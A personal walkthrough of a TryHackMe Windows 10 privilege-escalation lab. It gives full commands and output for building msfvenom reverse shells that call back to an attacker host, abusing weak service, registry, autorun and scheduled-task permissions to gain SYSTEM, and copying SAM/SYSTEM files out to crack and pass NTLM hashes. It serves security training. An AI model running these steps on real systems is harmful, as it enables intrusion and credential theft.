# Room
https://tryhackme.com/room/windows10privesc

# Task 1 - Deploy VM and connect using RDP
I use Remmina for RDP: https://remmina.org/

# Task 2 - Generate a reverse shell exe
* Create and transfer reverse.exe to the target
    ```
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=a.b.c.d LPORT=1234 -f exe -o reverse.exe

    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 460 bytes
    Final size of exe file: 7168 bytes
    Saved as: reverse.exe
    ```
* Start local SMB server to host the file
    ```
    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py transfer .

    Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

    [*] Config file parsed
    [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
    [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
    [*] Config file parsed
    [*] Config file parsed
    [*] Config file parsed
    ```
* From the target, copy the file
    ```
    PS C:\users\user> cd \privesc
    PS C:\privesc> copy \\a.b.c.d\transfer\reverse.exe .
    PS C:\privesc> dir reverse.exe


        Directory: C:\privesc


    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    -a----        1/25/2021   7:17 AM           7168 reverse.exe    
    ```
* Setup a local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    ```
* Execute reverse.exe on the target
    ```
    PS C:\privesc> .\reverse.exe
    PS C:\privesc>    
    ```
* Check listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.153.222] 49824
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\privesc>
    ```
# Task 3 - Service Exploits - Insecure Service Permissions
Use AccessChk to look at permissions

https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

* Check permissions for the user "user" to the service "daclsvc"
    ```
    C:\privesc>accesschk.exe /accepteula -uwcqv user daclsvc
    accesschk.exe /accepteula -uwcqv user daclsvc
    RW daclsvc
            SERVICE_QUERY_STATUS
            SERVICE_QUERY_CONFIG
            SERVICE_CHANGE_CONFIG      <----------------------
            SERVICE_INTERROGATE
            SERVICE_ENUMERATE_DEPENDENTS
            SERVICE_START
            SERVICE_STOP
            READ_CONTROL
    ```
* Query the daclsvc
    ```
    C:\privesc>sc qc daclsvc
    sc qc daclsvc
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: daclsvc
            TYPE               : 10  WIN32_OWN_PROCESS 
            START_TYPE         : 3   DEMAND_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
            LOAD_ORDER_GROUP   : 
            TAG                : 0
            DISPLAY_NAME       : DACL Service
            DEPENDENCIES       : 
            SERVICE_START_NAME : LocalSystem
    ```
* Because we are allowed the permission SERVICE_CHANGE_CONFIG, we can change things about the service, here we will change the BINARY_PATH_NAME to that of our reverse.exe program
    ```
    C:\privesc>sc config daclsvc binpath= "\"C:\privesc\reverse.exe\""
    sc config daclsvc binpath= "\"C:\privesc\reverse.exe\""
    [SC] ChangeServiceConfig SUCCESS
    ```
* Setup local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...    
    ```
* Start the daclsvc service to execute the new BINARY_PATH_NAME
    ```
    C:\Users\user>net start daclsvc
    ```
* Check listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.153.222] 49873
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system

    C:\Windows\system32>
    ```

# Task 4 - Service Exploits - Unquoted Service Path
A path that doesn't contain quotes can be exploited
* Query the unquoted service
    ```
    C:\PrivEsc>sc qc unquotedsvc
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: unquotedsvc
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 3   DEMAND_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : Unquoted Path Service
            DEPENDENCIES       :
            SERVICE_START_NAME : LocalSystem    
    ```
* Check permissions with accesschk
    ```
    C:\PrivEsc>accesschk /accepteula -uwdq "c:\program files\unquoted path service\"
    c:\program files\Unquoted Path Service
    Medium Mandatory Level (Default) [No-Write-Up]
    RW BUILTIN\Users          <------------------------------
    RW NT SERVICE\TrustedInstaller
    RW NT AUTHORITY\SYSTEM
    RW BUILTIN\Administrators    
    ```
* Copy reverse.exe to C:\Program Files\Unquoted Path Service\Common.exe, because there is a space in between the word Common and Files in the path, the service will look to execute Common
    ```
    C:\PrivEsc>copy reverse.exe "c:\program files\unquoted path service\common.exe"
            1 file(s) copied.    
    ```
* Start a local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    ```
* Start the service
    ```
    C:\PrivEsc>net start unquotedsvc
    ```
* Check the listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.244.101] 49751
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system

    C:\Windows\system32>
    ```
# Task 5 - Service Exploits - Weak Registry Permissions
Check the registry service and note what permissions it runs with
* Check the registry service
    ```
    C:\PrivEsc>sc qc regsvc
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: regsvc
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 3   DEMAND_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : Insecure Registry Service
            DEPENDENCIES       :
            SERVICE_START_NAME : LocalSystem
    ```
* Look at permissions with accesschk
    ```
    C:\PrivEsc>accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
    HKLM\System\CurrentControlSet\Services\regsvc
    Medium Mandatory Level (Default) [No-Write-Up]
    RW NT AUTHORITY\SYSTEM
            KEY_ALL_ACCESS
    RW BUILTIN\Administrators
            KEY_ALL_ACCESS
    RW NT AUTHORITY\INTERACTIVE      <----------------------
            KEY_ALL_ACCESS    
    ```
* Get details about the service from the registry
    ```
    C:\PrivEsc>reg query HKLM\System\CurrentControlSet\Services\regsvc

    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc
        Type    REG_DWORD    0x10
        Start    REG_DWORD    0x3
        ErrorControl    REG_DWORD    0x1
        ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        DisplayName    REG_SZ    Insecure Registry Service
        ObjectName    REG_SZ    LocalSystem

    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc\Security    
    ```
* Overwrite the ImagePath pointer from executing insecureregistryservice.exe to reverse.exe
    ```
    C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
    The operation completed successfully.    
    ```
* Verify it
    ```
    C:\PrivEsc>reg query HKLM\System\CurrentControlSet\Services\regsvc

    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc
        Type    REG_DWORD    0x10
        Start    REG_DWORD    0x3
        ErrorControl    REG_DWORD    0x1
        ImagePath    REG_EXPAND_SZ    C:\PrivEsc\reverse.exe
        DisplayName    REG_SZ    Insecure Registry Service
        ObjectName    REG_SZ    LocalSystem

    HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\regsvc\Security    
    ```
* Setup a local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    ```
* Start the service
    ```
    C:\PrivEsc>net start regsvc    
    ```
* Check your listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.244.101] 49794
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system

    C:\Windows\system32>
    ```
# Task 6 - Service Exploits - Insecure Service Executables
Review the file permissions service
* Check the service
    ```
    C:\PrivEsc>sc qc filepermsvc
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: filepermsvc
            TYPE               : 10  WIN32_OWN_PROCESS
            START_TYPE         : 3   DEMAND_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : File Permissions Service
            DEPENDENCIES       :
            SERVICE_START_NAME : LocalSystem    
    ```
* Check access
    ```
    C:\PrivEsc>accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
    C:\Program Files\File Permissions Service\filepermservice.exe
    Medium Mandatory Level (Default) [No-Write-Up]
    RW Everyone      <----------------------
            FILE_ALL_ACCESS
    RW NT AUTHORITY\SYSTEM
            FILE_ALL_ACCESS
    RW BUILTIN\Administrators
            FILE_ALL_ACCESS
    RW WIN-QBA94KB3IOF\Administrator
            FILE_ALL_ACCESS
    RW BUILTIN\Users
            FILE_ALL_ACCESS    
    ```
* Since the Everyone group has RW access, you can just copy reverse.exe and overwrite C:\Program Files\File Permissions Service\filepermservice.exe
    ```
    C:\PrivEsc>copy reverse.exe "c:\program files\file permissions service\filepermservice.exe" /y
            1 file(s) copied.    
    ```
* Setup local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    ```
* Start the service
    ```
    C:\PrivEsc>net start filepermsvc
    ```
* Check your listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.244.101] 49843
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system

    C:\Windows\system32>
    ```
# Task 7 - Registry - AutoRuns
Exploiting registry autorun programs
* List current autorun executables
    ```
    C:\PrivEsc>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
    ```
* Use accesschk to look at permissions for the executable found above
    ```
    C:\PrivEsc>accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

    AccessChk v4.02 - Check access of files, keys, objects, processes or services
    Copyright (C) 2006-2007 Mark Russinovich
    Sysinternals - www.sysinternals.com

    C:\Program Files\Autorun Program\program.exe
    Medium Mandatory Level (Default) [No-Write-Up]
    RW Everyone
            FILE_ALL_ACCESS
    RW NT AUTHORITY\SYSTEM
            FILE_ALL_ACCESS
    RW BUILTIN\Administrators
            FILE_ALL_ACCESS
    RW WIN-QBA94KB3IOF\Administrator
            FILE_ALL_ACCESS
    RW BUILTIN\Users
            FILE_ALL_ACCESS    
    ```
* Since the Everyone group can read/write for this autorun application, we can exploit that by overwriting the real exe with our malicious exe
    ```
    C:\PrivEsc>copy reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
            1 file(s) copied.    
    ```
* Setup a listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...    
    ```
* Restart the remote VM and then login to trigger reverse.exe
* Check your listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.182.226] 49689
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    win-qba94kb3iof\user

    C:\Windows\system32>
    ```
# Task 8 - Registry - AlwaysInstallElevated
This setting provides full admin rights to MSI installer packages and can be exploited
* Check for the setting in the registry for both HKCU and HKLM, a dword value of 0x1 means the setting is enabled
    ```
    C:\PrivEsc>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

    HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1


    C:\PrivEsc>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1    
    ```
* Use msfvenom to create an MSI reverse shell installer
    ```
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=a.b.c.d LPORT=1234 -f msi -o reverse.msi
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 460 bytes
    Final size of msi file: 159744 bytes
    Saved as: reverse.msi
    ```
* Start local SMB server to host the file
    ```
    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py transfer .

    Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

    [*] Config file parsed
    [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
    [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
    [*] Config file parsed
    [*] Config file parsed
    [*] Config file parsed
    ```
* From the target, copy the file
    ```
    C:\PrivEsc>copy \\a.b.c.d\transfer\reverse.msi .
            1 file(s) copied.

    C:\PrivEsc>dir reverse.msi
    Volume in drive C has no label.
    Volume Serial Number is 54A8-AA62

    Directory of C:\PrivEsc

    01/25/2021  12:55 PM           159,744 reverse.msi
                1 File(s)        159,744 bytes
                0 Dir(s)  30,919,589,888 bytes free
    ```
* Start a local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...    
    ```
* Run the installer on the target
    ```
    C:\PrivEsc>msiexec /quiet /qn /i reverse.msi
    ```
* Check listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.182.226] 49731
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system

    C:\Windows\system32>
    ```
# Task 9 - Passwords - Registry
The registry itself is often a place where programs store creds in clear text
* Search the registry for the phrase password
    ```
    C:\PrivEsc>reg query HKLM /f password /t REG_SZ /s
    ```
* Search the registry for auto login
    ```
    C:\PrivEsc>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon
        AutoRestartShell    REG_DWORD    0x1
        Background    REG_SZ    0 0 0
        CachedLogonsCount    REG_SZ    10
        DebugServerCommand    REG_SZ    no
        DefaultDomainName    REG_SZ
        DefaultUserName    REG_SZ    admin
        DisableBackButton    REG_DWORD    0x1
        EnableSIHostIntegration    REG_DWORD    0x1
        ForceUnlockLogon    REG_DWORD    0x0
        LegalNoticeCaption    REG_SZ
        LegalNoticeText    REG_SZ
        PasswordExpiryWarning    REG_DWORD    0x5
        PowerdownAfterShutdown    REG_SZ    0
        PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
        ReportBootOk    REG_SZ    1
        Shell    REG_SZ    explorer.exe
        ShellCritical    REG_DWORD    0x0
        ShellInfrastructure    REG_SZ    sihost.exe
        SiHostCritical    REG_DWORD    0x0
        SiHostReadyTimeOut    REG_DWORD    0x0
        SiHostRestartCountLimit    REG_DWORD    0x0
        SiHostRestartTimeGap    REG_DWORD    0x0
        Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
        VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
        WinStationsDisabled    REG_SZ    0
        scremoveoption    REG_SZ    0
        DisableCAD    REG_DWORD    0x1
        LastLogOffEndTimePerfCounter    REG_QWORD    0x236f172d
        ShutdownFlags    REG_DWORD    0x7
        AutoAdminLogon    REG_SZ    0
        AutoLogonSID    REG_SZ    S-1-5-21-3025105784-3259396213-1915610826-1001
        LastUsedUsername    REG_SZ    admin    
    ```
* Use winPEAS to find admin creds
    ```
    https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

    C:\PrivEsc>copy \\a.b.c.d\transfer\winPEAS.exe .
        1 file(s) copied.

    ==============================(Interesting files and registry)====================

    [+] Putty Sessions
        SessionName: BWP123F42
        ProxyPassword: [removed]
        ProxyUsername: admin
    ===================================================================================
    ```
* Test the creds using winexe
    ```
    winexe -U 'admin%[removed]' //10.10.144.167 cmd.exe
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    win-qba94kb3iof\admin

    C:\Windows\system32>
    ```
# Task 10 - Passwords - Saved Creds
You can use the cmdkey program to create, list, and delete stored usernames and passwords
* List saved creds with cmdkey
    ```
    C:\PrivEsc>cmdkey /list

    Currently stored credentials:

        Target: WindowsLive:target=virtualapp/didlogical
        Type: Generic
        User: 02nfpgrklkitqatu
        Local machine persistence

        Target: Domain:interactive=WIN-QBA94KB3IOF\admin
        Type: Domain Password
        User: WIN-QBA94KB3IOF\admin    
    ```
* Setup local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    ```
* Run reverse.exe with the saved creds you found earlier
    ```
    C:\PrivEsc>runas /savecred /user:admin reverse.exe
    Attempting to start reverse.exe as user "WIN-QBA94KB3IOF\admin" ...    
    ```
* Check listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.11.20] 49739
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    win-qba94kb3iof\admin

    C:\Windows\system32>
    ```
# Task 11 - Passwords - Security Account Manager (SAM)
The Security Account Manager (SAM) is a database in Windows that stores users' passwords.  The SYSTEM file contains the registry entries for HKLM\SYSTEM
* Copy the SAM and SYSTEM files to your machine
* Start local SMB server to receive the files
    ```
    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py transfer .

    Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation

    [*] Config file parsed
    [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
    [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
    [*] Config file parsed
    [*] Config file parsed
    [*] Config file parsed
    ```
* From the target, copy the files to your machine
    ```
    C:\PrivEsc>copy c:\windows\repair\SAM \\a.b.c.d\transfer\
            1 file(s) copied.

    C:\PrivEsc>copy c:\windows\repair\SYSTEM \\a.b.c.d\transfer\
            1 file(s) copied.

    ls -lrtah S*
    -rwxr-xr-x 1 root root 18M Dec 31  1969 SYSTEM
    -rwxr-xr-x 1 root root 64K Dec 31  1969 SAM
    ```
* Install cred dumping tools
    ```
    git clone https://github.com/Neohapsis/creddump7.git
    Cloning into 'creddump7'...
    remote: Enumerating objects: 84, done.
    remote: Total 84 (delta 0), reused 0 (delta 0), pack-reused 84
    Receiving objects: 100% (84/84), 43.88 KiB | 817.00 KiB/s, done.
    Resolving deltas: 100% (43/43), done.

    sudo apt install python-crypto
    [sudo] password for jet: 
    Reading package lists... Done
    Building dependency tree       
    Reading state information... Done
    python-crypto is already the newest version (2.6.1-13).
    ```

* Run pwdump on SYSTEM and SAM files
    ```
    creddump7/pwdump.py SYSTEM SAM
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
    user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
    admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
    ```
* Crack the admin NTLM hash with hashcat
    ```
    .\hashcat.exe -m 1000 -a 0 -w 3 a9fdfa038c4b75ebc76dc855dd74f0da .\rockyou.txt
    hashcat (v6.1.1) starting...

    Host memory required for this attack: 222 MB

    Dictionary cache hit:
    * Filename..: .\rockyou.txt
    * Passwords.: 14349525
    * Bytes.....: 139965214
    * Keyspace..: 14349525

    a9fdfa038c4b75ebc76dc855dd74f0da:[removed]

    Session..........: hashcat
    Status...........: Cracked
    Hash.Name........: NTLM
    Hash.Target......: a9fdfa038c4b75ebc76dc855dd74f0da
    Time.Started.....: Mon Jan 25 18:47:17 2021 (1 sec)
    Time.Estimated...: Mon Jan 25 18:47:18 2021 (0 secs)
    Guess.Base.......: File (.\rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........: 38286.3 kH/s (4.86ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
    Recovered........: 1/1 (100.00%) Digests
    Progress.........: 589824/14349525 (4.11%)
    Rejected.........: 0/589824 (0.00%)
    Restore.Point....: 0/14349525 (0.00%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidates.#1....: 123456 -> sideways2
    Hardware.Mon.#1..: Temp: 32c Fan: 52% Util: 10% Core:1506MHz Mem:3802MHz Bus:8

    Started: Mon Jan 25 18:47:16 2021
    Stopped: Mon Jan 25 18:47:19 2021    
    ```
# Task 12 - Passwords - Passing the Hash
Pass the hash is a technique that allows you to authenticate to a remote system by using the NTLM hash instead of the password for the account in question
* On your attacking machine, use the hash to connect
    ```
    pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.11.20 cmd.exe

    E_md4hash wrapper called.
    HASH PASS: Substituting user supplied NTLM HASH...
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    win-qba94kb3iof\admin

    C:\Windows\system32>
    ```
# Task 13 - Scheduled Tasks
* Check contents of script
    ```
    C:\DevTools>type cleanup.ps1
    type cleanup.ps1
    # This script will clean up all your old dev logs every minute.
    # To avoid permissions issues, run as SYSTEM (should probably fix this later)

    Remove-Item C:\DevTools\*.log
    ```
* Review the permissions of "user" for the file cleanup.ps1 with accesschk
    ```
    C:\DevTools>c:\PrivEsc\accesschk.exe /accepteula -quvw user c:\DevTools\CleanUp.ps1
    RW c:\DevTools\CleanUp.ps1
            FILE_ADD_FILE
            FILE_ADD_SUBDIRECTORY
            FILE_APPEND_DATA
            FILE_EXECUTE
            FILE_LIST_DIRECTORY
            FILE_READ_ATTRIBUTES
            FILE_READ_DATA
            FILE_READ_EA
            FILE_TRAVERSE
            FILE_WRITE_ATTRIBUTES
            FILE_WRITE_DATA      <----------------------
            FILE_WRITE_EA
            DELETE
            SYNCHRONIZE
            READ_CONTROL
    ```
* Start a local listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    ```
* Append execution of reverse.exe to the cleanup.ps1 script
    ```
    C:\DevTools>echo c:\PrivEsc\reverse.exe >> CleanUp.ps1

    C:\DevTools>type CleanUp.ps1
    # This script will clean up all your old dev logs every minute.
    # To avoid permissions issues, run as SYSTEM (should probably fix this later)

    Remove-Item C:\DevTools\*.log
    c:\PrivEsc\reverse.exe    
    ```
* Wait for the scheduled task to run and then check your listener
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.11.20] 49912
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    nt authority\system

    C:\Windows\system32>
    ```
# Task 14 - Insecure GUI Apps
If an application is running as an administrator, it is often easy to exploit it by running/launching another application within it

# Task 15 - Startup Apps
With accesschk, you can also view permissions for directories
* Check the startup folder with accesschk
    ```
    C:\PrivEsc>accesschk /accepteula -d "c:\programdata\microsoft\windows\start menu\programs\startup"

    AccessChk v4.02 - Check access of files, keys, objects, processes or services
    Copyright (C) 2006-2007 Mark Russinovich
    Sysinternals - www.sysinternals.com

    c:\programdata\microsoft\windows\start menu\programs\StartUp
    Medium Mandatory Level (Default) [No-Write-Up]
    RW BUILTIN\Users               <----------------------
    RW WIN-QBA94KB3IOF\Administrator
    RW WIN-QBA94KB3IOF\admin
    RW NT AUTHORITY\SYSTEM
    RW BUILTIN\Administrators
    R  Everyone    
    ```
* Create a shortcut for reverse.exe in the startup folder
    ```
    C:\PrivEsc>cscript CreateShortcut.vbs
    Microsoft (R) Windows Script Host Version 5.812
    Copyright (C) Microsoft Corporation. All rights reserved.


    C:\PrivEsc>dir "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    Volume in drive C has no label.
    Volume Serial Number is 54A8-AA62

    Directory of c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

    01/25/2021  04:33 PM    <DIR>          .
    01/25/2021  04:33 PM    <DIR>          ..
    01/25/2021  04:33 PM               623 reverse.lnk
                1 File(s)            623 bytes
                2 Dir(s)  30,848,651,264 bytes free    
    ```
* Create a listener and then login
    ```
    nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [a.b.c.d] from (UNKNOWN) [10.10.180.120] 49772
    Microsoft Windows [Version 10.0.17763.737]
    (c) 2018 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>whoami
    whoami
    win-qba94kb3iof\admin

    C:\Windows\system32>
    ```
# Task 16 - Token Impersonation - Rogue Potato
Reading material here:

https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

# Task 17 - Token Impersonation - PrintSpoofer
Reading material here:

https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

# Task 18 - Windows Privilege Escalation Scripts
* winPEASany.exe

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
* Seatbelt.exe

https://github.com/GhostPack/Seatbelt

* PowerUp.ps1

https://github.com/PowerShellEmpire/PowerTools

* SharpUp.exe

https://github.com/GhostPack/SharpUp
